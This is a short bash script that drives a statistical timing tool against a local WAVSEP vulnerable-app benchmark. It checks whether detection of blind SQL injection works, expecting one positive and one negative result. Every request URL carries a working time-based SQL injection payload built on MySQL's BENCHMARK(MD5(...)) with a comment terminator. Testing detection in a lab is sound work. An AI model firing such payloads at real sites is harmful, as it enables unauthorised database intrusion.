#!/bin/bash

# SAMPLE_SIZE --
# SAMPLE_SIZE*2 + THROWAWAYS*2 = total number of HTTP requests
SAMPLE_SIZE=12 
THROWAWAYS=1
BASE_URL="http://wavsep.local/wavsep"
MARK_POS=50000
MARK_NEG=5
MWU_APP=./http-mwu

echo "expecting positive SQL injection detection  (p < alpha)"
echo "======================================================="
${MWU_APP} \
	-throwaways="${THROWAWAYS}" \
       	-x-url="${BASE_URL}/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=1%20and%201%20in%20(select%20BENCHMARK(${MARK_NEG},MD5(CHAR(97)))%20)%20--%20" \
	-y-url="${BASE_URL}/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=1%20and%201%20in%20(select%20BENCHMARK(${MARK_POS},MD5(CHAR(97)))%20)%20--%20" \
	-sample-size=${SAMPLE_SIZE}

echo
echo "expected negative SQL injection detection (p > alpha)" 
echo "====================================================="
${MWU_APP} \
	-throwaways="${THROWAWAYS}" \
       	-x-url="${BASE_URL}/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=1%20and%201%20in%20(select%20BENCHMARK(${MARK_NEG},MD5(CHAR(97)))%20)%20--%20" \
	-y-url="${BASE_URL}/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=1%20and%201%20in%20(select%20BENCHMARK(${MARK_NEG},MD5(CHAR(97)))%20)%20--%20" \
	-sample-size=${SAMPLE_SIZE}
